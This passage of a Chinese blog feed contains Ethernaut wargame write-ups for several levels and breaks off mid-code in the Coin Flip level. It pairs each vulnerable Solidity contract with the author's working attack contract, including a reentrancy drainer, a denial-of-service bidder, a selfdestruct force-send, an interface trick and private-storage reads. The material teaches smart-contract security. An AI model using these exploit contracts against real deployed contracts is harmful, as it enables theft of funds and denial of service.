        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-7-12"><a href="#Ethernaut靶场刷题记录-7-12" class="headerlink" title="Ethernaut靶场刷题记录(7-12)"></a>Ethernaut靶场刷题记录(7-12)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="07-Force"><a href="#07-Force" class="headerlink" title="07 Force"></a>07 Force</h2><p>这道题是为了考查我们对自毁函数<code>selfdestruct</code>的认识<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;&#x2F;*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         &#x2F;\_&#x2F;\   &#x2F;</span><br><span class="line">    ____&#x2F; o o \</span><br><span class="line">  &#x2F;~____  &#x3D;ø&#x3D; &#x2F;</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*&#x2F;&#125;</span><br></pre></td></tr></table></figure><br>这就是一个空合约，题目想要我们给这个合约转一笔账，可我们知道，一个没有任何函数的合约是没有办法接收转账的。者就用到了自毁函数<code>selfdestruct</code></p><blockquote><p>自毁函数selfdestruct：<br>    当我们调用这个函数时，它会使合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数。（因为之前提到，如果合约收到一笔没有任何函数可以处理的资金时，就会调用fallback函数，而selfdestruct函数无视这一点，也就是资金会优先由selfdestruct函数处理）</p></blockquote><p>我们只需要自己写一个新合约，往里面存一点测试币，然后调用自毁函数<code>selfdestruct</code>将参数设置为此合约的地址，我们合约里的token<br>就会转到此合约当中。<br/><br>攻击合约如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Attck&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">receive() payable external&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function dosome() public payable&#123;</span><br><span class="line">    selfdestruct(0x0F8AaD423dc5aE12382CEc67412dADb6e2b0eFF3);&#x2F;&#x2F;Force的地址</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>解题步骤</li></ul><ol><li>直接使用metamask给我自己的攻击合约转账<br><img src="../images/ethernaut/e07/01.png" alt=""></li><li>执行攻击合约的dosome函数</li><li>通关</li></ol><h1 id="09-King"><a href="#09-King" class="headerlink" title="09 King"></a>09 King</h1><p>这是一个Dos攻击（拒绝服务）型的漏洞<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这是一个类似于拍卖的合约<br>题目的意思其实就是说让我们在成功报价后，想办法让别人无法对你的报价再进行竞拍。因为刚好前两天才系统性的了解了拒绝服务DDOS攻击，这道题就变得很容易。</p><blockquote><p>因为这个竞拍合约需要向上一个竞拍者转账后才能完成竞拍成功（完成king的交换），那我们不让他转账成功不就可以永远不被替换了嘛，需要我们创建一个攻击合约，而此合约需要fallable和receive函数不能设置为payable，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract AttackKing &#123;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _victim) public payable &#123;</span><br><span class="line">        _victim.call.gas(1000000).value(msg.value)(&quot;&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>在此攻击合约中我们不写任何receive fallback函数，那么默认就是没有payable修饰的，自然也就接收不了转账。当然，也可以在receive中用revert()语句去终止交易。</p><ul><li>解题步骤</li></ul><ol><li>先用<code>web3.eth.getStorageAt(&#39;0x2814Cd87DdF364D7A5Ef9BAC507fdad131956647&#39;,1)</code>查看一下当前竞拍值是多少<br><img src="../images/ethernaut/e08/01.png" alt=""><br>在这里可以看到是0.001ether，那么我们就需要提供大于0.001ether的报价才能成为king</li><li>在创建攻击合约时，同时存0.0011个ether进去(如果你测试币多的话直接传1ether就行)<br><img src="../images/ethernaut/e08/02.jpg" alt=""></li><li>通关</li></ol></blockquote><h2 id="10-Re-Entrancy"><a href="#10-Re-Entrancy" class="headerlink" title="10 Re-Entrancy"></a>10 Re-Entrancy</h2><p>顾名思义，这是一个重入漏洞<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts-ethereum-package&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] &#x3D; balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;&#x3D; _amount) &#123;</span><br><span class="line">      (bool result,) &#x3D; msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -&#x3D; _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以注意到withdraw函数里面很明显是存在重入漏洞的，（在更改全局变量之前进行了外部调用）于是我们利用这个漏洞写出攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line"></span><br><span class="line">    address payable target;</span><br><span class="line">    uint amount &#x3D; 1000000000000000 wei;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _addr) public payable &#123;</span><br><span class="line">        target&#x3D;_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1() public payable&#123;</span><br><span class="line">        target.call&#123;value: amount&#125;(abi.encodeWithSignature(&quot;donate(address)&quot;,address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setp2() public payable &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fallback () external payable&#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意第一步第二步最好分开写，否则可能造成交易超过gas limit的上限导致执行失败</p><ul><li>解题步骤<br>按照step1，2执行即可<br><img src="../images/ethernaut/e10/01.png" alt=""><br>可以看到原合约已经没有token了。而我们的账户有了很多，攻击成功。<br><img src="../images/ethernaut/e10/02.png" alt=""></li></ul><h1 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11 Elevator"></a>11 Elevator</h1><p>这道题其实考的是编程时的一个逻辑漏洞<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building &#x3D; Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor &#x3D; _floor;</span><br><span class="line">      top &#x3D; building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目想要我们到达顶层，也就是把<code>top</code>变为true，但是我们明显能看到想要进入<code>goTo(uint)</code>中的判断条件，<code>building.isLastFloor(_floor)</code>就必须是<code>false</code>，<code>top</code>也等于这个值，乍一看想要<code>top=true</code>好像是个不可能的事。但由于<code>Building</code>是个接口，而<code>isLastFloor</code>则是一个抽象函数，这里<code>Building(msg.sender)</code>远程调用我们传入的合约，因此我们可以自己设计这个函数的具体内容。</p><blockquote><p>其实在这里两次调用了<code>building.isLastFloor(floor)</code>，他们的返回值一定是一样的吗？既然我们可以自定义函数，我们就可以在函数里面做一些变动让判断条件在第二次调用时，返回相反的值。</p></blockquote><p>攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">  function goTo(uint _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyBuilding&#123;</span><br><span class="line">    uint temp &#x3D; 5;</span><br><span class="line">    Elevator e;</span><br><span class="line">    function isLastFloor(uint i) external returns (bool)&#123;</span><br><span class="line">        if(temp &#x3D;&#x3D; i)&#123;</span><br><span class="line">            temp &#x3D; 6;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function dosome() public&#123;</span><br><span class="line">        address adr &#x3D; 0xd8b4056b73Cd9E7890a32548cEAd96D6116B52ae;&#x2F;&#x2F;Elevator地址</span><br><span class="line">        e &#x3D; Elevator(adr);</span><br><span class="line">        &#x2F;&#x2F; adr.call(abi.encodeWithSignature(&quot;goTo(uint256)&quot;,5));</span><br><span class="line">        e.goTo(5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，在第一次调用之后我就把temp的值变了，那么第二次再进行判断时，就会返回true。</p><ul><li>解题步骤<br>执行dosome()即可</li></ul><h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12 Privacy"></a>12 Privacy</h2><p>这个题和前面08 Vault几乎一样，实质就是告诉我们以太坊中的储存，就算是private修饰，他也是可以被访问到的，比如用web3脚本<br><code>web3.eth.getStorageAt()</code>就可以轻松访问到。<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked &#x3D; true;</span><br><span class="line">  uint256 public ID &#x3D; block.timestamp;</span><br><span class="line">  uint8 private flattening &#x3D; 10;</span><br><span class="line">  uint8 private denomination &#x3D; 255;</span><br><span class="line">  uint16 private awkwardness &#x3D; uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data &#x3D; _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key &#x3D;&#x3D; bytes16(data[2]));</span><br><span class="line">    locked &#x3D; false;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们只要获得key就可以通关，也就是合约中的<code>data</code>,<br>直接获取即可。</p><ul><li>解题步骤<ol><li>用<code>web3.eth.getStorageAt(&#39;0xe1442525366a0cC8e2D25E480B0ACf47FE291Ecc&#39;,5)</code>得到data<br><img src="../images/ethernaut/e12/01.png" alt=""></li><li>然后由于require中的判断是去前16个byte，去前32位执行unlock方法即可<br><img src="../images/ethernaut/e12/02.png" alt=""></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 01-06</title>
      <link href="/2022/06/21/ethernaut01/"/>
      <url>/2022/06/21/ethernaut01/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-1-6"><a href="#Ethernaut靶场刷题记录-1-6" class="headerlink" title="Ethernaut靶场刷题记录(1-6)"></a>Ethernaut靶场刷题记录(1-6)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="01-FallBack"><a href="#01-FallBack" class="headerlink" title="01 FallBack"></a>01 FallBack</h2><p>这道题是比较简单的，合约的逻辑有问题导致出现漏洞<br/><br>我们先来了解一下receive和fallback的区别：</p><blockquote><p><strong>receive():</strong><br>    一个合约只能有一个receive函数，该函数不能有参数和返回值，需设置为external，payable；<br><strong>fallback():</strong><br>    一个合约只能有一个receive函数，该函数不能有参数和返回值，需设置为external；<br>    可设置为payable；</p></blockquote><p>当本合约的其他函数不匹配调用，或调用者未提供任何信息，且没有receive函数，fallback函数被触发；<br>当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发；</p><p>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    contributions[msg.sender] &#x3D; 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目中给到的SafeMath的地址已经获取不到了，我直接选择找了老版本的SafeMath源码在我本地拉取下来。或者也可以直接用<code>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;</code>路径代替。<br/></p><p>题目想要我们获得合约的所有权，<code>owner</code>再使用<code>withdraw</code>提取出来</p><ul><li><p>解题思路<br>  阅读完源码发现此合约的<code>receive</code>函数是有明显漏洞的，我们只需要向此函数转发出一笔转账交易即可将<code>owner</code>的所有权改为自己</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  当然，为了达成<code>receive</code>中的require限制条件，我们还需要执行一次<code>contribute()</code>来将我们的<code>contributions[msg.sender] &gt; 0</code><br/><br>  在获得<code>owner</code>后，执行<code>withdraw()</code>即可通关。</p></li><li><p>解题步骤</p><ol><li>在控制台中调用<code>contract.contribute({value:1)</code>在不带单位的情况下默认单位为<code>wei</code><br><img src="../images\ethernaut\e01\01.png" alt=""></li><li>可以使用<code>contract.address</code>命令查看合约地址，然后使用metamask给合约地址转一笔账<br><img src="../images\ethernaut\e01\02_1.png" alt=""><br><img src="../images\ethernaut\e01\02_2.png" alt=""></li><li>此时<code>owner</code>应该已经到了，我们来看一下：<br><img src="../images\ethernaut\e01\03.png" alt=""></li><li>执行<code>withdraw()</code>函数进行提款<br><img src="../images\ethernaut\e01\04.png" alt=""></li><li>通关<br><img src="../images\ethernaut\e01\05.png" alt=""></li></ol></li></ul><h2 id="02-Fallout"><a href="#02-Fallout" class="headerlink" title="02 Fallout"></a>02 Fallout</h2><p>  emmm很白痴的关卡<br>  先看代码</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">          require(</span><br><span class="line">              msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">              &quot;caller is not the owner&quot;</span><br><span class="line">          );</span><br><span class="line">          _;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] &#x3D; allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  题目要求获得合约的所有权。<br>  我看了这个合约很久，一直没找到可以攻击的地方……直到我看到了<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>  仔细看这个构造函数的名字，我们会发现<code>Fal1out</code>中间居然有个<code>1</code>关键是他还在上面注释了<code>constructor</code>就很坑。<br/><br>  那既然它不是个构造函数，并且具有构造函数的功能，那我们直接调用这个错误的“构造函数”就可以获得合约的所有权了。</p><blockquote><p>构造函数最好用<code>constructor() public {……}</code>的写法</p><ul><li>解题步骤<ol><li>调用<code>fal1out</code>函数<br><img src="../images/ethernaut/e02/01.png" alt=""></li><li>可以看到此时我们已经获得了合约的所有权<br><img src="../images/ethernaut/e02/03.png" alt=""></li><li>通关<br><img src="../images/ethernaut/e02/suc.png" alt=""></li></ol></li></ul></blockquote><h2 id="03-Coin-Flip"><a href="#03-Coin-Flip" class="headerlink" title="03 Coin Flip"></a>03 Coin Flip</h2><p>这是一个和区块结构有关的漏洞，由于用<code>blockhash(block.number.sub(1))</code>的方式计算上一区块的哈希的方式是极容易被攻击利用的。<br/><br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue.div(FACTOR);</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side &#x3D;&#x3D; _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    